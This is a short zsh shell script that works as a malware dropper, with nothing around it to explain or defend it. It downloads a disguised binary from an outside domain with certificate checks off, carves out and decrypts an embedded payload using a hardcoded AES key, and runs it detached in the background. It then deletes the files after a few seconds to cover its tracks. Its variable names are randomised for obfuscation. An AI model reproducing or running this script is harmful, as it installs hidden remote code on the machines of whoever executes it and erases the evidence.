#!/bin/zsh
g3gvf=$(mktemp /tmp/fyp5cm.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m79f5beba20fd6b94.bin" -o "$g3gvfz" || exit 1
aazdgd=$(stat -f %z "$g3gvfz"); mr68twq=$(( aazdgd - 1070 - 2526 ))
tail -c +$(( 1070 + 1 )) "$g3gvfz" | head -c $mr68twq | openssl enc -d -aes-256-cbc -k bebf26f1b4d7eca9c9bd3e1f -out "$g3gvf" 2>/dev/null
[ -s "$g3gvf" ] && chmod 700 "$g3gvf" && ( "$g3gvf" & ) && disown
( sleep 3; rm -f "$g3gvf" "$g3gvfz" ) &>/dev/null &
